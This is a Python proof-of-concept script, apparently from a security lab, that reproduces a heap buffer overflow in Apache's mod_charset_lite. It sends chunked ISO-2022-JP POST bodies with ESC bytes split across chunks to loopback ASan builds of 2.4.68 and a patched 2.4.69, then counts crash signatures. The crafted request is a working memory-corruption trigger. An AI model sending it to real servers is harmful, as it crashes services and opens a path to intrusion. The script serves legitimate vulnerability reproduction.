#!/usr/bin/env python3
"""Adjacent lane L6: CVE-2026-56153 mod_charset_lite finish_partial_char.

A POST body in ISO-2022-JP is translated to UTF-8 by XLATEIN.  A chunked
request puts a trailing ESC at a bucket boundary, so set_aside_partial_char()
saves one byte; the next bucket of ESC bytes makes finish_partial_char()
append bytes past the 8-byte ctx->buf on 2.4.68.  2.4.69 has the bounds
guard.  Loopback only; no external traffic.

Usage (from lab/apache2shell):
  python3 l6-lane.py                 # 2.4.68 affected, 2.4.69 control
  L6_SUFFIX=control python3 l6-lane.py 2.4.68
"""
import os
import signal
import socket
import subprocess
import sys
import time

BASE = "/home/mesh-home/mishe-tauftauf2shell/lab/apache2shell"
RUN = os.path.join(BASE, "run")
LOGS = os.path.join(BASE, "logs")
ROOT = os.path.join(BASE, "l6")
FIRST = bytes.fromhex(os.environ.get("L6_FIRST_HEX", "411b"))   # 'A' + ESC
NEXT = bytes.fromhex(os.environ.get("L6_NEXT_HEX", "1b" * 32))  # ESC run
NREQ = int(os.environ.get("L6_N", "4"))
SUFFIX = os.environ.get("L6_SUFFIX", "default")
NOCHARSET = os.environ.get("L6_NOCHARSET", "").lower() in ("1", "yes", "on")
SAMECHARSET = os.environ.get("L6_SAMECHARSET", "").lower() in ("1", "yes", "on")
DOCROOT = os.path.join(ROOT, "docroot-" + SUFFIX)


def conf_for(version, port):
    install = os.path.join(ROOT, "install-%s-asan" % version)
    directives = ""
    if not NOCHARSET:
        default = "UTF-8" if SAMECHARSET else "ISO-2022-JP"
        directives = ("  CharsetSourceEnc UTF-8\n"
                      "  CharsetDefault %s\n" % default)
    return """ServerRoot "{install}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule cgi_module modules/mod_cgi.so
LoadModule charset_lite_module modules/mod_charset_lite.so
ServerName localhost
ErrorLog "{err}"
LogLevel info charset_lite:trace2
DocumentRoot "{docroot}"
<Directory "{docroot}">
  Require all granted
  Options +ExecCGI
  AddHandler cgi-script .cgi
{directives}</Directory>
""".format(install=install,
           pid=os.path.join(RUN, "l6-%s-%s.pid" % (version, SUFFIX)),
           port=port,
           err=os.path.join(LOGS, "l6-%s-%s-error.log" % (version, SUFFIX)),
           docroot=DOCROOT, directives=directives)


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    for line in open(pidfile):
        try:
            os.kill(int(line.strip()), signal.SIGTERM)
        except ProcessLookupError:
            pass
    for _ in range(30):
        if not os.path.exists(pidfile):
            break
        time.sleep(0.1)


def request(port):
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    chunks = [(b"%x\r\n" % len(FIRST)) + FIRST + b"\r\n",
              (b"%x\r\n" % len(NEXT)) + NEXT + b"\r\n",
              b"0\r\n\r\n"]
    body = b"".join(chunks)
    req = (b"POST /echo.cgi HTTP/1.1\r\nHost: localhost\r\n"
           b"Transfer-Encoding: chunked\r\n"
           b"Content-Type: text/plain; charset=ISO-2022-JP\r\n"
           b"Connection: close\r\n\r\n") + body
    s.sendall(req)
    data = b""
    while True:
        b = s.recv(65536)
        if not b:
            break
        data += b
    s.close()
    return data


def probe(version, port):
    os.makedirs(DOCROOT, exist_ok=True)
    cgi = os.path.join(DOCROOT, "echo.cgi")
    with open(cgi, "w") as f:
        f.write("#!/bin/sh\ncat >/dev/null\nprintf 'Content-Type: text/plain\\r\\n\\r\\nOK\\r\\n'\n")
    os.chmod(cgi, 0o755)
    err = os.path.join(LOGS, "l6-%s-%s-error.log" % (version, SUFFIX))
    conf = os.path.join(RUN, "l6-%s-%s.conf" % (version, SUFFIX))
    pidf = os.path.join(RUN, "l6-%s-%s.pid" % (version, SUFFIX))
    open(conf, "w").write(conf_for(version, port))
    if os.path.exists(err):
        os.unlink(err)
    stop(pidf)
    httpd = os.path.join(ROOT, "install-%s-asan" % version, "bin", "httpd")
    srv = subprocess.Popen([httpd, "-f", conf],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(1.5)
    statuses = []
    for _ in range(NREQ):
        try:
            r = request(port)
            statuses.append(r.split(b"\r\n", 1)[0].decode(errors="replace"))
        except Exception as e:
            statuses.append("ERR:%s" % e)
    stop(pidf)
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    out = srv.stdout.read().decode(errors="replace")
    log = open(err, errors="replace").read() if os.path.exists(err) else ""
    hay = log + out
    tag = "%s-%s" % (version, SUFFIX)
    open(os.path.join(LOGS, "l6-%s-combined.log" % tag), "w").write(hay)
    print("=== %s port %d suffix=%s first=%s next=%s ===" % (
        version, port, SUFFIX, FIRST.hex(), NEXT.hex()[:16]))
    print("statuses:", statuses)
    print("child SEGV:", log.count("exit signal Segmentation fault"),
          "child ABRT:", log.count("exit signal Aborted"),
          "srv rc:", srv.returncode)
    for needle in ("AddressSanitizer", "heap-buffer-overflow",
                   "WRITE of size", "finish_partial_char", "mod_charset_lite",
                   "runtime error", "SEGV"):
        print("  %-22s : %d" % (needle, hay.count(needle)))
    return hay


if __name__ == "__main__":
    versions = sys.argv[1:] or ["2.4.68", "2.4.69"]
    ports = {"2.4.68": 7294, "2.4.69": 7295}
    for v in versions:
        probe(v, ports[v])
